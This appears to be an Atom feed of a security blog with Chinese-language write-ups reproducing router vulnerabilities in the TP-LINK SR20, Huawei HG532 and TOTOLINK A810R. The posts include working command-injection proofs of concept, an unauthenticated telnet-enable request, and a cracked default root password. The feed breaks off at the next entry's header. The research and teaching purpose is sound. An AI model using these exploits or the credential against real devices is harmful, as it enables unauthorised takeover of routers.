<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C12en</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-10-10T14:11:40.061Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>C12en</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>TP-LINK SR20漏洞复现</title>
    <link href="http://example.com/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-10-08T08:50:13.000Z</published>
    <updated>2023-10-10T14:11:40.061Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个涉及到了通信协议的洞 还是比较有趣的  以此来顺便丰富一下对于协议洞的认知<br>固件下载地址: <a href="https://www.tp-link.com/us/support/download/sr20/#Firmware">https://www.tp-link.com/us/support/download/sr20/#Firmware</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本质上是一个任意命令执行 不过传入的方式和以前复现过的不一样在于 是通过recvform接收到了对应端口传输的数据<br>找到官方报告中 漏洞位于的&#x2F;usr&#x2F;bin&#x2F;tddp文件<br>是32位的arm架构<br>ida打开后没有找到main函数 通过start函数来索引到main函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // r3</span><br><span class="line">  int v4; // r0</span><br><span class="line">  int v6; // [sp+Ch] [bp-8h]</span><br><span class="line">  int v7; // [sp+Ch] [bp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = mem_calloc(argc, argv, envp);</span><br><span class="line">  if ( v6 )</span><br><span class="line">    return v6;</span><br><span class="line">  v4 = sub_936C();</span><br><span class="line">  v7 = delete_mem(v4);</span><br><span class="line">  if ( v7 )</span><br><span class="line">    v3 = v7;</span><br><span class="line">  else</span><br><span class="line">    v3 = 0;</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要有三个函数 首尾两个函数的作用我已经更改了函数名 就是简单的开辟空间和释放空间<br>重点跟进一下936c这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_936C()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // r4</span><br><span class="line">  int optval; // [sp+Ch] [bp-B0h] BYREF</span><br><span class="line">  int v3; // [sp+10h] [bp-ACh] BYREF</span><br><span class="line">  struct timeval timeout; // [sp+14h] [bp-A8h] BYREF</span><br><span class="line">  fd_set readfds; // [sp+1Ch] [bp-A0h] BYREF</span><br><span class="line">  _DWORD *v6; // [sp+9Ch] [bp-20h] BYREF</span><br><span class="line">  int v7; // [sp+A0h] [bp-1Ch]</span><br><span class="line">  int nfds; // [sp+A4h] [bp-18h]</span><br><span class="line">  fd_set *v9; // [sp+A8h] [bp-14h]</span><br><span class="line">  unsigned int i; // [sp+ACh] [bp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = 0;</span><br><span class="line">  v3 = 1;</span><br><span class="line">  optval = 1;</span><br><span class="line">  printf(&quot;[%s():%d] tddp task start\n&quot;, &quot;tddp_taskEntry&quot;, 151);</span><br><span class="line">  if ( !sub_16ACC(&amp;v6)</span><br><span class="line">    &amp;&amp; !sub_16E5C(v6 + 9)</span><br><span class="line">    &amp;&amp; !setsockopt(v6[9], 1, 2, &amp;optval, 4u)</span><br><span class="line">    &amp;&amp; !sub_16D68(v6[9], 1040)                  // 绑定1040端口</span><br><span class="line">    &amp;&amp; !setsockopt(v6[9], 1, 6, &amp;v3, 4u) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[11] |= 2u;</span><br><span class="line">    v6[11] |= 4u;</span><br><span class="line">    v6[11] |= 8u;</span><br><span class="line">    v6[11] |= 0x10u;</span><br><span class="line">    v6[11] |= 0x20u;</span><br><span class="line">    v6[11] |= 0x1000u;</span><br><span class="line">    v6[11] |= 0x2000u;</span><br><span class="line">    v6[11] |= 0x4000u;</span><br><span class="line">    v6[11] |= 0x8000u;</span><br><span class="line">    v6[12] = 60;</span><br><span class="line">    v0 = v6;</span><br><span class="line">    v0[13] = sub_9340();                        // 获取时间</span><br><span class="line">    v9 = &amp;readfds;</span><br><span class="line">    for ( i = 0; i &lt;= 0x1F; ++i )</span><br><span class="line">      v9-&gt;__fds_bits[i] = 0;</span><br><span class="line">    nfds = v6[9] + 1;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        timeout.tv_sec = 600;</span><br><span class="line">        timeout.tv_usec = 0;</span><br><span class="line">        readfds.__fds_bits[v6[9] &gt;&gt; 5] |= 1 &lt;&lt; (v6[9] &amp; 0x1F);</span><br><span class="line">        v7 = select(nfds, &amp;readfds, 0, 0, &amp;timeout);</span><br><span class="line">        if ( sub_9340() - v6[13] &gt; v6[12] )</span><br><span class="line">          v6[8] = 0;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v7 == -1 );</span><br><span class="line">      if ( !v7 )</span><br><span class="line">        break;</span><br><span class="line">      if ( ((readfds.__fds_bits[v6[9] &gt;&gt; 5] &gt;&gt; (v6[9] &amp; 0x1F)) &amp; 1) != 0 )</span><br><span class="line">        sub_16418(v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_16E0C(v6[9]);</span><br><span class="line">  sub_16C18(v6);</span><br><span class="line">  return printf(&quot;[%s():%d] tddp task exit\n&quot;, &quot;tddp_taskEntry&quot;, 219);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用socket来实现通讯<br>sub_16D68函数中 绑定了1040端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_16D68(int a1, uint16_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // r3</span><br><span class="line">  struct sockaddr s; // [sp+8h] [bp-14h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, sizeof(s));</span><br><span class="line">  s.sa_family = 2;</span><br><span class="line">  *&amp;s.sa_data[2] = htonl(0);</span><br><span class="line">  *s.sa_data = htons(a2);</span><br><span class="line">  if ( bind(a1, &amp;s, 0x10u) == -1 )</span><br><span class="line">    v2 = sub_13018(-10103, &quot;failed to bind socket&quot;);</span><br><span class="line">  else</span><br><span class="line">    v2 = 0;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时把主机字节序转化成了网络字节序 用来方便不同设备之间的统一通讯<br>随后会进入sub_16418函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091017618.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091017618.png" alt="image.png"></a><br>该函数旨在接收1040端口传输来的数据<br>这里注意一下数据包存放的缓冲区地址为 a1+45083 而v2作为一个指针指向该地址<br>对于v2进行了一个检测 如果为1则进入分支<br>这里涉及到了dttp这个协议 其为D-LINK所使用的一种简单的调试协议<br>分为v1和v2两个版本<br>版本号会放在数据包首地址来作为区分<br>随后还会有一个用来表示类型的字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4：CMD_AUTO_TEST   6: CMD_CONFIG_MAC   7: CMD_CANCEL_TEST</span><br><span class="line">8: CMD_REBOOT_FOR_TEST   0XA:CMD_GET_PROD_ID   0XC: CMD_SYS_INIT </span><br><span class="line">0XD: CMD_CONFIG_PIN   0X30: CMD_FTEST_USB   0X31: CMD_FTEST_CONFIG</span><br></pre></td></tr></table></figure><p>也就是我们在sub_15E74函数中所看到的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091021475.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091021475.png" alt="image.png"></a><br>这里借用winmt师傅的图来方便理解包的形式<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091022913.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091022913.png" alt="image.png"></a><br>ver为版本号 type则为包的类型<br>本次的漏洞出现在0x31对应的类型中 我们找到对应的函数进行跟进<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091031214.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091031214.png" alt="image.png"></a><br>其以;进行了正则匹配 将两段字符串分别存储到s和v10中 随后进行了命令执行<br>那么这里仅仅过滤了一个;字符 我们也可以使用|和&amp;来达到任意命令执行的目的</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用readelf可以得到是32位小端序的arm架构 这里使用armhf 不适用armel是因为其缺少硬件浮点数支持<br>搭建脚本:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap1 -u root</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo ifconfig tap1 192.168.6.2</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line"></span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line"></span><br><span class="line">    -kernel ./armhf/vmlinuz-3.2.0-4-vexpress \</span><br><span class="line"></span><br><span class="line">    -initrd ./armhf/initrd.img-3.2.0-4-vexpress \</span><br><span class="line"></span><br><span class="line">    -drive if=sd,file=./armhf/debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line"></span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line"></span><br><span class="line">    -net nic -net tap,ifname=tap1,script=no,downscript=no \</span><br><span class="line"></span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>我这里的硬盘映像文件虽然是直接从官网下的 但是不知道什么原因 在模拟的时候会提示说硬盘大小出现问题<br>所以这里按照描述更改映像文件为32G即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-img resize debian_wheezy_armhf_standard.qcow2 32G</span><br></pre></td></tr></table></figure><p>随后就可以成功启动模拟 进入后将eth0接口更改 使其与tap1位于同一c段<br>随后挂载两个文件夹并且设置squashfs-root为根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line">chroot ./squashfs-root/ sh</span><br></pre></td></tr></table></figure><p>启动tddp程序<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102144951.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102144951.png" alt="image.png"></a><br>接着回到宿主机 这里如果直接nc 1040这个端口是无法连接的<br>我们需要借助nmap的udp扫描方式<br>可以看到这个端口是有过滤的<br>等下使用脚本复现的时候也要注意一下socket需要调整为UDP<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102145130.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102145130.png" alt="image.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在虚拟机启动tddp后 使用脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import*</span><br><span class="line"></span><br><span class="line">from sys import*</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;192.168.6.3&quot;,1040))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = b&quot;\x01\x31&quot; #版本号和类型</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(12,b&#x27;\x00&#x27;) #填充垃圾数据</span><br><span class="line"></span><br><span class="line">payload += b&quot;|touch a||;aaa&quot;</span><br><span class="line"></span><br><span class="line">s.sendall(payload)</span><br></pre></td></tr></table></figure><p>第一个|用来分割touch和前面的指令 使其单执行touch 后两个||用来屏蔽后面的参数 防止影响<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209311.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209311.png" alt="image.png"></a><br>随后我们前往&#x2F;tmp目录 可以找到刚刚创建的a文件 成功进行了任意的命令执行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209512.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209512.png" alt="image.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次复现 第一次接触到了协议洞 相比常规的命令执行 协议洞需要先了解清楚协议的数据包构成 才能看懂代码逻辑<br>发掘漏洞的思路还是通过定位execve或者是system这类敏感函数 然后再朔源查看是否存在控制参数的可能性</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE 2017-17215</title>
    <link href="http://example.com/2023/10/07/cve-2017-17215/"/>
    <id>http://example.com/2023/10/07/cve-2017-17215/</id>
    <published>2023-10-07T12:52:47.000Z</published>
    <updated>2023-10-07T13:20:19.160Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>华为HG532部分定制版本存在远程代码执行漏洞 经过身份验证的攻击者可以向端口 37215 发送恶意数据包以发起攻击 成功利用可能导致远程执行任意代码<br>固件下载地址: <a href="https://archive.org/download/RouterHG532e/router%20HG532e.rar">https://archive.org/download/RouterHG532e/router%20HG532e.rar</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>readelf分析出来是mips32位大端序<br>qemu启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line"></span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mips -M malta -kernel ./mips_kernel/vmlinux-2.6.32-5-4kc-malta -hda ./mips_kernel/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>接着配置系统模拟的eth0接口为192.168.6.xx<br>随后利用scp上传一下提取出来的squashfs-root文件夹<br>接着需要再开一个终端 ssh连接一下<br>这里是因为&#x2F;bin&#x2F;mic文件的执行过程中会造成eth0接口的静态ip发生变化 所以需要我们利用ssh启动服务 随后在原本的会话中重新配置eth0接口的地址<br>挂载一下相关服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev  </span><br><span class="line">mount -t proc /proc ./squashfs-root/proc/</span><br></pre></td></tr></table></figure><p>开启ssh连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.6.3</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ sh</span><br><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure><p>然后就会卡在这里 返回到qemu启动的那个会话 重新配置一下eth0接口就行了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072059413.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072059413.png" alt="image.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据官方的漏洞报告 我们可以得知漏洞出现的路径为&#x2F;ctrlt&#x2F;DeviceUpgrade_1 并且出现任意命令执行的参数为NewStatusURL和NewDownloadURL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From looking into the UPnP description of the device, it can be seen that it supports a service type named `DeviceUpgrade`. This service is supposedly carrying out a firmware upgrade action by sending a request to “/ctrlt/DeviceUpgrade_1” (referred to as controlURL ) and is carried out with two elements  named `NewStatusURL` and `NewDownloadURL`.</span><br></pre></td></tr></table></figure><p>利用grep指令可以定位到DeviceUpgrade字符串位于upnp文件中有出现<br>利用NewDownloadURL定位到目标函数 发现直接通过sprintf传参给了system函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_40749C(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // $s1</span><br><span class="line">  const char *v4; // [sp+20h] [-40Ch] BYREF</span><br><span class="line">  const char *v5; // [sp+24h] [-408h] BYREF</span><br><span class="line">  char v6[1028]; // [sp+28h] [-404h] BYREF</span><br><span class="line"></span><br><span class="line">  v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewDownloadURL&quot;, 0, &amp;v4);</span><br><span class="line">  if ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewStatusURL&quot;, 0, &amp;v5);</span><br><span class="line">      if ( !v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          snprintf(v6, 1024, &quot;upg -g -U %s -t &#x27;1 Firmware Upgrade Image&#x27; -c upnp -r %s -d -b&quot;, v4, v5);</span><br><span class="line">          system(v6);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个疑惑的点 虽然官方的报告说&#x2F;ctrlt&#x2F;DeviceUpgrade_1是负责固件的更新 但是不管是直接访问 还是抓包固件更新的按钮  我都没有得到访问该路径的包<br>所以只能直接用网上的exp了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">    &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">data = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line"></span><br><span class="line"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;NewStatusURL&gt;;mkdir /bin/hell;&lt;/NewStatusURL&gt;</span><br><span class="line"></span><br><span class="line">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/u:Upgrade&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/s:Body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/s:Envelope&gt;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">requests.post(&#x27;http://192.168.6.3:37215/ctrlt/DeviceUpgrade_1&#x27;,headers=headers,data=data)</span><br></pre></td></tr></table></figure><p>如果成功执行 那么就会新建一个&#x2F;bin&#x2F;hell文件夹<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072119503.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072119503.png" alt="image.png"></a></p><h1 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h1><p>不难看出 漏洞的核心点就在于system函数的参数没有得到限制 如果在实际的漏洞挖掘中<br>应该遍历涉及到system函数的地方 然后看参数是否可控 可控的话参数是否进行了过滤<br>如果可以利用 那么就朔源如何访问到这一函数 随后编写exp</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>TOTOLINK-A810R分析</title>
    <link href="http://example.com/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/</id>
    <published>2023-09-25T02:25:35.000Z</published>
    <updated>2023-09-26T13:39:49.613Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>偶然间看到了一个cve  是totolink的其他型号 随后发现我手上的这个貌似也存在这个漏洞 于是记录一下自己发掘的过程<br>设备型号:TOTOLINK A810R<br>固件版本: V5.9c.4573_B20191019<br>下载地址: <a href="https://totolink.tw/support_view/A810R">https://totolink.tw/support_view/A810R</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>binwalk提取出文件系统后 老规矩还是来看一下架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png" alt="image.png"></a><br>随后就是qemu系统模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line"></span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>然后上传文件系统 chroot以及启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -oHostKeyAlgorithms=+ssh-dss 1.zip root@192.168.6.3:/</span><br><span class="line">root/</span><br><span class="line">chroot ./squashfs-root /bin/sh</span><br><span class="line">./bin/lighttpd -f lighttp/lighttpd.conf  -m lighttp/lib/</span><br></pre></td></tr></table></figure><p>但是由于totolink的管理界面 常规的浏览器是不支持的 需要ie浏览器<br>但是linux安装ie浏览器过于麻烦 所以我直接闲鱼花30买了个真机用来复现</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先使用firmwalker来看一下文件系统中有什么可以利用的地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh ../iot/_TOTOLINK_A810R_V5.9c.4573_B20191019.web.extracted/squashfs-root ./firmwalker.txt</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png" alt="image.png"></a><br>可以看到 存在着telnet服务 我们访问一下这个网页 看看有什么功能<br>访问后直接跳转到了登录界面<br>由于这里我们已经知道了用户密码 所以先登录进去<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png" alt="image.png"></a><br>可以看到就是一个功能简单的 设置是否开启telnet服务的页面<br>这里直接使用burp来看一下按下apply按钮后发送的包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 60</span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://192.168.0.1/telnet.asp?timestamp=1695703177052</span><br><span class="line">Cookie: SESSION_ID=2:1571586185:2</span><br><span class="line"></span><br><span class="line">&#123;&quot;telnet_enabled&quot;:&quot;1&quot;,</span><br><span class="line">&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向cstecgi.cgi进行了一个post请求<br>包含了一个json表单 一个有两个参数 telnet_enabled和topicurl<br>前者应该是用来控制是否开启telnet服务 而后者应该是用来决定处理方式<br>因为利用浏览器的开发者工具 可以捕捉到一个包的参数为 “topicurl”:”setting&#x2F;getTelnetCfg”<br>同时我们观察一下包的内容  可以发现其实对于是否登录并没有进行检测<br>我们凭借这个poc就可以做到越权开启telnet服务<br>扫描端口发现开在了23<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png" alt="image.png"></a><br>尝试nc连接发现需要账号密码<br>而我们最开始使用firmwalker是扫描到了密码的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png" alt="image.png"></a><br>打开看看这三个文件 发现是空的 不过紧邻着etc&#x2F;shadow的shadow.example存放着root用户的md5加密后的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::</span><br><span class="line">nobody:*:0:0:99999:7:::</span><br></pre></td></tr></table></figure><p>解密后发现是cs2012<br>随后成功连接上路由器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png" alt="image.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2022-26258</title>
    <link href="http://example.com/2023/09/23/CVE-2022-26258/"/>
    <id>http://example.com/2023/09/23/CVE-2022-26258/</id>
    <published>2023-09-23T07:21:25.000Z</published>
    <updated>2023-09-23T15:29:37.253Z</updated>
    
